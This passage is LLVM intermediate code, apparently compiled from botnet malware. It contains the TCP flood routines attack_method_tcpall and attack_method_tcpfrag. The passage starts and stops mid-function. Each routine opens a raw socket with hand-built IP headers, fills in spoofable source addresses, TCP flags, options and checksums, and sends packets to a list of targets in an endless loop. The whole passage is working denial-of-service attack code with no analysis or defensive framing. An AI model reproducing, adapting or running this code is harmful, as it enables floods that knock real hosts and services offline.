  %284 = icmp slt i32 %283, %43
  br i1 %284, label %.lr.ph.split, label %.loopexit.loopexit141

; <label>:285:                                    ; preds = %4, %109
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpall(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 17, i32 65535)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 18, i32 0)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 1)
  %24 = trunc i32 %23 to i8
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 1)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 1)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 1)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 1)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 1)
  %34 = trunc i32 %33 to i16
  %35 = load i32, i32* @LOCAL_ADDR, align 4
  %36 = tail call i32 @attack_get_opt_ip(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %35)
  %37 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %285, label %39

; <label>:39:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %40 = bitcast i32* %5 to i8*
  %41 = call i32 @setsockopt(i32 %37, i32 0, i32 3, i8* nonnull %40, i32 4) #10
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %109, label %.preheader128

.preheader128:                                    ; preds = %39
  store i32 0, i32* %5, align 4
  %43 = zext i8 %0 to i32
  %44 = icmp eq i8 %0, 0
  br i1 %44, label %.preheader, label %.lr.ph130

.lr.ph130:                                        ; preds = %.preheader128
  %45 = icmp eq i8 %16, 0
  %46 = trunc i32 %21 to i16
  %47 = and i8 %24, 1
  %48 = zext i8 %47 to i16
  %49 = shl nuw nsw i16 %48, 13
  %50 = shl i16 %26, 12
  %51 = and i16 %50, 4096
  %52 = shl i16 %28, 11
  %53 = and i16 %52, 2048
  %54 = shl i16 %30, 10
  %55 = and i16 %54, 1024
  %56 = shl i16 %32, 9
  %57 = and i16 %56, 512
  %58 = shl i16 %34, 8
  %59 = and i16 %58, 256
  %60 = or i16 %49, %51
  %61 = or i16 %60, %53
  %62 = or i16 %61, %55
  %.masked = or i16 %62, %57
  %63 = or i16 %.masked, %59
  %64 = or i16 %63, 160
  %65 = zext i8 %0 to i64
  br i1 %45, label %.lr.ph130.split.us.preheader, label %.lr.ph130.split.preheader

.lr.ph130.split.preheader:                        ; preds = %.lr.ph130
  br label %.lr.ph130.split

.lr.ph130.split.us.preheader:                     ; preds = %.lr.ph130
  br label %.lr.ph130.split.us

.lr.ph130.split.us:                               ; preds = %.lr.ph130.split.us.preheader, %.lr.ph130.split.us
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph130.split.us ], [ 0, %.lr.ph130.split.us.preheader ]
  %66 = call noalias i8* @calloc(i64 128, i64 1) #10
  %67 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %66, i8** %67, align 8
  %68 = getelementptr inbounds i8, i8* %66, i64 20
  %69 = getelementptr inbounds i8, i8* %66, i64 40
  store i8 69, i8* %66, align 4
  %70 = getelementptr inbounds i8, i8* %66, i64 1
  store i8 %10, i8* %70, align 1
  %71 = call zeroext i16 @htons(i16 zeroext 60) #11
  %72 = getelementptr inbounds i8, i8* %66, i64 2
  %73 = bitcast i8* %72 to i16*
  store i16 %71, i16* %73, align 2
  %74 = call zeroext i16 @htons(i16 zeroext %12) #11
  %75 = getelementptr inbounds i8, i8* %66, i64 4
  %76 = bitcast i8* %75 to i16*
  store i16 %74, i16* %76, align 4
  %77 = getelementptr inbounds i8, i8* %66, i64 8
  store i8 %14, i8* %77, align 4
  %78 = getelementptr inbounds i8, i8* %66, i64 9
  store i8 6, i8* %78, align 1
  %79 = getelementptr inbounds i8, i8* %66, i64 12
  %80 = bitcast i8* %79 to i32*
  store i32 %36, i32* %80, align 4
  %81 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %82 = load i32, i32* %81, align 4
  %83 = getelementptr inbounds i8, i8* %66, i64 16
  %84 = bitcast i8* %83 to i32*
  store i32 %82, i32* %84, align 4
  %85 = call zeroext i16 @htons(i16 zeroext %18) #11
  %86 = bitcast i8* %68 to i16*
  store i16 %85, i16* %86, align 4
  %87 = call zeroext i16 @htons(i16 zeroext %20) #11
  %88 = getelementptr inbounds i8, i8* %66, i64 22
  %89 = bitcast i8* %88 to i16*
  store i16 %87, i16* %89, align 2
  %90 = call zeroext i16 @htons(i16 zeroext %46) #11
  %91 = zext i16 %90 to i32
  %92 = getelementptr inbounds i8, i8* %66, i64 24
  %93 = bitcast i8* %92 to i32*
  store i32 %91, i32* %93, align 4
  %94 = getelementptr inbounds i8, i8* %66, i64 32
  %95 = bitcast i8* %94 to i16*
  store i16 %64, i16* %95, align 4
  %96 = getelementptr inbounds i8, i8* %66, i64 41
  store i8 2, i8* %69, align 1
  %97 = getelementptr inbounds i8, i8* %66, i64 42
  store i8 4, i8* %96, align 1
  %98 = call zeroext i16 @htons(i16 zeroext 1400) #11
  %99 = bitcast i8* %97 to i16*
  store i16 %98, i16* %99, align 2
  %100 = getelementptr inbounds i8, i8* %66, i64 44
  %101 = getelementptr inbounds i8, i8* %66, i64 45
  store i8 4, i8* %100, align 1
  %102 = getelementptr inbounds i8, i8* %66, i64 46
  store i8 2, i8* %101, align 1
  %103 = getelementptr inbounds i8, i8* %66, i64 47
  store i8 8, i8* %102, align 1
  store i8 10, i8* %103, align 1
  %104 = getelementptr inbounds i8, i8* %66, i64 56
  %105 = getelementptr inbounds i8, i8* %66, i64 57
  store i8 1, i8* %104, align 1
  %106 = getelementptr inbounds i8, i8* %66, i64 58
  store i8 3, i8* %105, align 1
  %107 = getelementptr inbounds i8, i8* %66, i64 59
  store i8 3, i8* %106, align 1
  store i8 6, i8* %107, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %108 = icmp slt i64 %indvars.iv.next, %65
  br i1 %108, label %.lr.ph130.split.us, label %..preheader_crit_edge.loopexit

; <label>:109:                                    ; preds = %39
  %110 = call i32 @close(i32 %37) #10
  br label %285

..preheader_crit_edge.loopexit:                   ; preds = %.lr.ph130.split.us
  br label %..preheader_crit_edge

..preheader_crit_edge.loopexit142:                ; preds = %.lr.ph130.split
  br label %..preheader_crit_edge

..preheader_crit_edge:                            ; preds = %..preheader_crit_edge.loopexit142, %..preheader_crit_edge.loopexit
  %.lcssa131.in = phi i64 [ %indvars.iv.next, %..preheader_crit_edge.loopexit ], [ %indvars.iv.next136, %..preheader_crit_edge.loopexit142 ]
  %.lcssa131 = trunc i64 %.lcssa131.in to i32
  store i32 %.lcssa131, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader128, %..preheader_crit_edge
  %111 = icmp eq i32 %36, -1
  %112 = and i32 %11, 65535
  %113 = icmp eq i32 %112, 65535
  %114 = and i32 %17, 65535
  %115 = icmp eq i32 %114, 65535
  %116 = and i32 %19, 65535
  %117 = icmp eq i32 %116, 65535
  %118 = icmp eq i32 %21, 65535
  %119 = icmp eq i32 %22, 65535
  %120 = icmp eq i8 %24, 0
  br label %.loopexit

.lr.ph130.split:                                  ; preds = %.lr.ph130.split.preheader, %.lr.ph130.split
  %indvars.iv135 = phi i64 [ %indvars.iv.next136, %.lr.ph130.split ], [ 0, %.lr.ph130.split.preheader ]
  %121 = call noalias i8* @calloc(i64 128, i64 1) #10
  %122 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv135
  store i8* %121, i8** %122, align 8
  %123 = getelementptr inbounds i8, i8* %121, i64 20
  %124 = getelementptr inbounds i8, i8* %121, i64 40
  store i8 69, i8* %121, align 4
  %125 = getelementptr inbounds i8, i8* %121, i64 1
  store i8 %10, i8* %125, align 1
  %126 = call zeroext i16 @htons(i16 zeroext 60) #11
  %127 = getelementptr inbounds i8, i8* %121, i64 2
  %128 = bitcast i8* %127 to i16*
  store i16 %126, i16* %128, align 2
  %129 = call zeroext i16 @htons(i16 zeroext %12) #11
  %130 = getelementptr inbounds i8, i8* %121, i64 4
  %131 = bitcast i8* %130 to i16*
  store i16 %129, i16* %131, align 4
  %132 = getelementptr inbounds i8, i8* %121, i64 8
  store i8 %14, i8* %132, align 4
  %133 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %134 = getelementptr inbounds i8, i8* %121, i64 6
  %135 = bitcast i8* %134 to i16*
  store i16 %133, i16* %135, align 2
  %136 = getelementptr inbounds i8, i8* %121, i64 9
  store i8 6, i8* %136, align 1
  %137 = getelementptr inbounds i8, i8* %121, i64 12
  %138 = bitcast i8* %137 to i32*
  store i32 %36, i32* %138, align 4
  %139 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv135, i32 1
  %140 = load i32, i32* %139, align 4
  %141 = getelementptr inbounds i8, i8* %121, i64 16
  %142 = bitcast i8* %141 to i32*
  store i32 %140, i32* %142, align 4
  %143 = call zeroext i16 @htons(i16 zeroext %18) #11
  %144 = bitcast i8* %123 to i16*
  store i16 %143, i16* %144, align 4
  %145 = call zeroext i16 @htons(i16 zeroext %20) #11
  %146 = getelementptr inbounds i8, i8* %121, i64 22
  %147 = bitcast i8* %146 to i16*
  store i16 %145, i16* %147, align 2
  %148 = call zeroext i16 @htons(i16 zeroext %46) #11
  %149 = zext i16 %148 to i32
  %150 = getelementptr inbounds i8, i8* %121, i64 24
  %151 = bitcast i8* %150 to i32*
  store i32 %149, i32* %151, align 4
  %152 = getelementptr inbounds i8, i8* %121, i64 32
  %153 = bitcast i8* %152 to i16*
  store i16 %64, i16* %153, align 4
  %154 = getelementptr inbounds i8, i8* %121, i64 41
  store i8 2, i8* %124, align 1
  %155 = getelementptr inbounds i8, i8* %121, i64 42
  store i8 4, i8* %154, align 1
  %156 = call zeroext i16 @htons(i16 zeroext 1400) #11
  %157 = bitcast i8* %155 to i16*
  store i16 %156, i16* %157, align 2
  %158 = getelementptr inbounds i8, i8* %121, i64 44
  %159 = getelementptr inbounds i8, i8* %121, i64 45
  store i8 4, i8* %158, align 1
  %160 = getelementptr inbounds i8, i8* %121, i64 46
  store i8 2, i8* %159, align 1
  %161 = getelementptr inbounds i8, i8* %121, i64 47
  store i8 8, i8* %160, align 1
  store i8 10, i8* %161, align 1
  %162 = getelementptr inbounds i8, i8* %121, i64 56
  %163 = getelementptr inbounds i8, i8* %121, i64 57
  store i8 1, i8* %162, align 1
  %164 = getelementptr inbounds i8, i8* %121, i64 58
  store i8 3, i8* %163, align 1
  %165 = getelementptr inbounds i8, i8* %121, i64 59
  store i8 3, i8* %164, align 1
  store i8 6, i8* %165, align 1
  %indvars.iv.next136 = add nsw i64 %indvars.iv135, 1
  %166 = icmp slt i64 %indvars.iv.next136, %65
  br i1 %166, label %.lr.ph130.split, label %..preheader_crit_edge.loopexit142

.loopexit.loopexit:                               ; preds = %208
  br label %.loopexit.backedge

.loopexit.loopexit141:                            ; preds = %266
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %44, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit141
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %111, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %208
  %167 = phi i32 [ %225, %208 ], [ 0, %.lr.ph.split.us.preheader ]
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds i8*, i8** %8, i64 %168
  %170 = load i8*, i8** %169, align 8
  %171 = bitcast i8* %170 to %struct.iphdr*
  %172 = getelementptr inbounds i8, i8* %170, i64 20
  %173 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %168, i32 2
  %174 = load i8, i8* %173, align 4
  %175 = icmp ult i8 %174, 32
  br i1 %175, label %176, label %183

; <label>:176:                                    ; preds = %.lr.ph.split.us
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %168, i32 1
  %178 = load i32, i32* %177, align 4
  %179 = call i32 @ntohl(i32 %178) #11
  %180 = call i32 @htonl(i32 %179) #11
  %181 = getelementptr inbounds i8, i8* %170, i64 16
  %182 = bitcast i8* %181 to i32*
  store i32 %180, i32* %182, align 4
  br label %183

; <label>:183:                                    ; preds = %.lr.ph.split.us, %176
  %184 = getelementptr inbounds i8, i8* %170, i64 12
  %185 = bitcast i8* %184 to i32*
  store i32 0, i32* %185, align 4
  br i1 %113, label %186, label %189

; <label>:186:                                    ; preds = %183
  %187 = getelementptr inbounds i8, i8* %170, i64 4
  %188 = bitcast i8* %187 to i16*
  store i16 0, i16* %188, align 4
  br label %189

; <label>:189:                                    ; preds = %186, %183
  br i1 %115, label %190, label %192

; <label>:190:                                    ; preds = %189
  %191 = bitcast i8* %172 to i16*
  store i16 0, i16* %191, align 4
  br label %192

; <label>:192:                                    ; preds = %190, %189
  br i1 %117, label %193, label %196

; <label>:193:                                    ; preds = %192
  %194 = getelementptr inbounds i8, i8* %170, i64 22
  %195 = bitcast i8* %194 to i16*
  store i16 0, i16* %195, align 2
  br label %196

; <label>:196:                                    ; preds = %193, %192
  br i1 %118, label %197, label %200

; <label>:197:                                    ; preds = %196
  %198 = getelementptr inbounds i8, i8* %170, i64 24
  %199 = bitcast i8* %198 to i32*
  store i32 0, i32* %199, align 4
  br label %200

; <label>:200:                                    ; preds = %197, %196
  br i1 %119, label %201, label %204

; <label>:201:                                    ; preds = %200
  %202 = getelementptr inbounds i8, i8* %170, i64 28
  %203 = bitcast i8* %202 to i32*
  store i32 0, i32* %203, align 4
  br label %204

; <label>:204:                                    ; preds = %201, %200
  br i1 %120, label %208, label %205

; <label>:205:                                    ; preds = %204
  %206 = getelementptr inbounds i8, i8* %170, i64 38
  %207 = bitcast i8* %206 to i16*
  store i16 0, i16* %207, align 2
  br label %208

; <label>:208:                                    ; preds = %205, %204
  %209 = getelementptr inbounds i8, i8* %170, i64 10
  %210 = bitcast i8* %209 to i16*
  store i16 0, i16* %210, align 2
  %211 = bitcast i8* %170 to i16*
  %212 = call zeroext i16 @checksum_generic(i16* %211, i32 20)
  store i16 %212, i16* %210, align 2
  %213 = getelementptr inbounds i8, i8* %170, i64 36
  %214 = bitcast i8* %213 to i16*
  store i16 0, i16* %214, align 4
  %215 = call zeroext i16 @htons(i16 zeroext 40) #11
  %216 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %171, i8* nonnull %172, i16 zeroext %215, i32 40)
  store i16 %216, i16* %214, align 4
  %217 = getelementptr inbounds i8, i8* %170, i64 22
  %218 = bitcast i8* %217 to i16*
  %219 = load i16, i16* %218, align 2
  %220 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %168, i32 0, i32 1
  store i16 %219, i16* %220, align 2
  %221 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %168, i32 0
  %222 = bitcast %struct.sockaddr_in* %221 to %struct.sockaddr*
  %223 = call i64 @sendto(i32 %37, i8* nonnull %170, i64 60, i32 16384, %struct.sockaddr* %222, i32 16) #10
  %224 = load i32, i32* %5, align 4
  %225 = add nsw i32 %224, 1
  store i32 %225, i32* %5, align 4
  %226 = icmp slt i32 %225, %43
  br i1 %226, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %266
  %227 = phi i32 [ %283, %266 ], [ 0, %.lr.ph.split.preheader ]
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds i8*, i8** %8, i64 %228
  %230 = load i8*, i8** %229, align 8
  %231 = bitcast i8* %230 to %struct.iphdr*
  %232 = getelementptr inbounds i8, i8* %230, i64 20
  %233 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %228, i32 2
  %234 = load i8, i8* %233, align 4
  %235 = icmp ult i8 %234, 32
  br i1 %235, label %236, label %243

; <label>:236:                                    ; preds = %.lr.ph.split
  %237 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %228, i32 1
  %238 = load i32, i32* %237, align 4
  %239 = call i32 @ntohl(i32 %238) #11
  %240 = call i32 @htonl(i32 %239) #11
  %241 = getelementptr inbounds i8, i8* %230, i64 16
  %242 = bitcast i8* %241 to i32*
  store i32 %240, i32* %242, align 4
  br label %243

; <label>:243:                                    ; preds = %.lr.ph.split, %236
  br i1 %113, label %244, label %247

; <label>:244:                                    ; preds = %243
  %245 = getelementptr inbounds i8, i8* %230, i64 4
  %246 = bitcast i8* %245 to i16*
  store i16 0, i16* %246, align 4
  br label %247

; <label>:247:                                    ; preds = %244, %243
  br i1 %115, label %248, label %250

; <label>:248:                                    ; preds = %247
  %249 = bitcast i8* %232 to i16*
  store i16 0, i16* %249, align 4
  br label %250

; <label>:250:                                    ; preds = %248, %247
  br i1 %117, label %251, label %254

; <label>:251:                                    ; preds = %250
  %252 = getelementptr inbounds i8, i8* %230, i64 22
  %253 = bitcast i8* %252 to i16*
  store i16 0, i16* %253, align 2
  br label %254

; <label>:254:                                    ; preds = %251, %250
  br i1 %118, label %255, label %258

; <label>:255:                                    ; preds = %254
  %256 = getelementptr inbounds i8, i8* %230, i64 24
  %257 = bitcast i8* %256 to i32*
  store i32 0, i32* %257, align 4
  br label %258

; <label>:258:                                    ; preds = %255, %254
  br i1 %119, label %259, label %262

; <label>:259:                                    ; preds = %258
  %260 = getelementptr inbounds i8, i8* %230, i64 28
  %261 = bitcast i8* %260 to i32*
  store i32 0, i32* %261, align 4
  br label %262

; <label>:262:                                    ; preds = %259, %258
  br i1 %120, label %266, label %263

; <label>:263:                                    ; preds = %262
  %264 = getelementptr inbounds i8, i8* %230, i64 38
  %265 = bitcast i8* %264 to i16*
  store i16 0, i16* %265, align 2
  br label %266

; <label>:266:                                    ; preds = %262, %263
  %267 = getelementptr inbounds i8, i8* %230, i64 10
  %268 = bitcast i8* %267 to i16*
  store i16 0, i16* %268, align 2
  %269 = bitcast i8* %230 to i16*
  %270 = call zeroext i16 @checksum_generic(i16* %269, i32 20)
  store i16 %270, i16* %268, align 2
  %271 = getelementptr inbounds i8, i8* %230, i64 36
  %272 = bitcast i8* %271 to i16*
  store i16 0, i16* %272, align 4
  %273 = call zeroext i16 @htons(i16 zeroext 40) #11
  %274 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %231, i8* %232, i16 zeroext %273, i32 40)
  store i16 %274, i16* %272, align 4
  %275 = getelementptr inbounds i8, i8* %230, i64 22
  %276 = bitcast i8* %275 to i16*
  %277 = load i16, i16* %276, align 2
  %278 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %228, i32 0, i32 1
  store i16 %277, i16* %278, align 2
  %279 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %228, i32 0
  %280 = bitcast %struct.sockaddr_in* %279 to %struct.sockaddr*
  %281 = call i64 @sendto(i32 %37, i8* %230, i64 60, i32 16384, %struct.sockaddr* %280, i32 16) #10
  %282 = load i32, i32* %5, align 4
  %283 = add nsw i32 %282, 1
  store i32 %283, i32* %5, align 4
  %284 = icmp slt i32 %283, %43
  br i1 %284, label %.lr.ph.split, label %.loopexit.loopexit141

; <label>:285:                                    ; preds = %4, %109
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpfrag(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 17, i32 65535)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 18, i32 0)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 1)
  %24 = trunc i32 %23 to i8
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 1)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 1)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 1)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 1)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 1)
  %34 = trunc i32 %33 to i16
  %35 = load i32, i32* @LOCAL_ADDR, align 4
  %36 = tail call i32 @attack_get_opt_ip(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %35)
  %37 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %285, label %39

; <label>:39:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %40 = bitcast i32* %5 to i8*
  %41 = call i32 @setsockopt(i32 %37, i32 0, i32 3, i8* nonnull %40, i32 4) #10
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %109, label %.preheader128

.preheader128:                                    ; preds = %39
  store i32 0, i32* %5, align 4
  %43 = zext i8 %0 to i32
  %44 = icmp eq i8 %0, 0
  br i1 %44, label %.preheader, label %.lr.ph130

.lr.ph130:                                        ; preds = %.preheader128
  %45 = icmp eq i8 %16, 0
  %46 = trunc i32 %21 to i16
  %47 = and i8 %24, 1
  %48 = zext i8 %47 to i16
  %49 = shl nuw nsw i16 %48, 13
  %50 = shl i16 %26, 12
  %51 = and i16 %50, 4096
  %52 = shl i16 %28, 11
  %53 = and i16 %52, 2048
  %54 = shl i16 %30, 10
  %55 = and i16 %54, 1024
  %56 = shl i16 %32, 9
  %57 = and i16 %56, 512
  %58 = shl i16 %34, 8
  %59 = and i16 %58, 256
  %60 = or i16 %49, %51
  %61 = or i16 %60, %53
  %62 = or i16 %61, %55
  %.masked = or i16 %62, %57
  %63 = or i16 %.masked, %59
  %64 = or i16 %63, 160
  %65 = zext i8 %0 to i64
  br i1 %45, label %.lr.ph130.split.us.preheader, label %.lr.ph130.split.preheader

.lr.ph130.split.preheader:                        ; preds = %.lr.ph130
  br label %.lr.ph130.split

.lr.ph130.split.us.preheader:                     ; preds = %.lr.ph130
  br label %.lr.ph130.split.us

.lr.ph130.split.us:                               ; preds = %.lr.ph130.split.us.preheader, %.lr.ph130.split.us
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph130.split.us ], [ 0, %.lr.ph130.split.us.preheader ]
  %66 = call noalias i8* @calloc(i64 128, i64 1) #10
  %67 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %66, i8** %67, align 8
  %68 = getelementptr inbounds i8, i8* %66, i64 20
  %69 = getelementptr inbounds i8, i8* %66, i64 40
  store i8 69, i8* %66, align 4
  %70 = getelementptr inbounds i8, i8* %66, i64 1
  store i8 %10, i8* %70, align 1
  %71 = call zeroext i16 @htons(i16 zeroext 60) #11
  %72 = getelementptr inbounds i8, i8* %66, i64 2
  %73 = bitcast i8* %72 to i16*
  store i16 %71, i16* %73, align 2
  %74 = call zeroext i16 @htons(i16 zeroext %12) #11
  %75 = getelementptr inbounds i8, i8* %66, i64 4
  %76 = bitcast i8* %75 to i16*
  store i16 %74, i16* %76, align 4
  %77 = getelementptr inbounds i8, i8* %66, i64 8
  store i8 %14, i8* %77, align 4
  %78 = getelementptr inbounds i8, i8* %66, i64 9
  store i8 6, i8* %78, align 1
  %79 = getelementptr inbounds i8, i8* %66, i64 12
  %80 = bitcast i8* %79 to i32*
  store i32 %36, i32* %80, align 4
  %81 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %82 = load i32, i32* %81, align 4
  %83 = getelementptr inbounds i8, i8* %66, i64 16
  %84 = bitcast i8* %83 to i32*
  store i32 %82, i32* %84, align 4
  %85 = call zeroext i16 @htons(i16 zeroext %18) #11
  %86 = bitcast i8* %68 to i16*
  store i16 %85, i16* %86, align 4
  %87 = call zeroext i16 @htons(i16 zeroext %20) #11
  %88 = getelementptr inbounds i8, i8* %66, i64 22
  %89 = bitcast i8* %88 to i16*
  store i16 %87, i16* %89, align 2
  %90 = call zeroext i16 @htons(i16 zeroext %46) #11
  %91 = zext i16 %90 to i32
  %92 = getelementptr inbounds i8, i8* %66, i64 24
  %93 = bitcast i8* %92 to i32*
  store i32 %91, i32* %93, align 4
  %94 = getelementptr inbounds i8, i8* %66, i64 32
  %95 = bitcast i8* %94 to i16*
  store i16 %64, i16* %95, align 4
  %96 = getelementptr inbounds i8, i8* %66, i64 41
  store i8 2, i8* %69, align 1
  %97 = getelementptr inbounds i8, i8* %66, i64 42
  store i8 4, i8* %96, align 1
  %98 = call zeroext i16 @htons(i16 zeroext 1400) #11
  %99 = bitcast i8* %97 to i16*
  store i16 %98, i16* %99, align 2
  %100 = getelementptr inbounds i8, i8* %66, i64 44
  %101 = getelementptr inbounds i8, i8* %66, i64 45
  store i8 4, i8* %100, align 1
  %102 = getelementptr inbounds i8, i8* %66, i64 46
  store i8 2, i8* %101, align 1
  %103 = getelementptr inbounds i8, i8* %66, i64 47
  store i8 8, i8* %102, align 1
  store i8 10, i8* %103, align 1
  %104 = getelementptr inbounds i8, i8* %66, i64 56
  %105 = getelementptr inbounds i8, i8* %66, i64 57
  store i8 1, i8* %104, align 1
  %106 = getelementptr inbounds i8, i8* %66, i64 58
  store i8 3, i8* %105, align 1
  %107 = getelementptr inbounds i8, i8* %66, i64 59
  store i8 3, i8* %106, align 1
  store i8 6, i8* %107, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %108 = icmp slt i64 %indvars.iv.next, %65
  br i1 %108, label %.lr.ph130.split.us, label %..preheader_crit_edge.loopexit

; <label>:109:                                    ; preds = %39
  %110 = call i32 @close(i32 %37) #10
  br label %285

..preheader_crit_edge.loopexit:                   ; preds = %.lr.ph130.split.us
  br label %..preheader_crit_edge

..preheader_crit_edge.loopexit142:                ; preds = %.lr.ph130.split
  br label %..preheader_crit_edge

..preheader_crit_edge:                            ; preds = %..preheader_crit_edge.loopexit142, %..preheader_crit_edge.loopexit
  %.lcssa131.in = phi i64 [ %indvars.iv.next, %..preheader_crit_edge.loopexit ], [ %indvars.iv.next136, %..preheader_crit_edge.loopexit142 ]
  %.lcssa131 = trunc i64 %.lcssa131.in to i32
  store i32 %.lcssa131, i32* %5, align 4
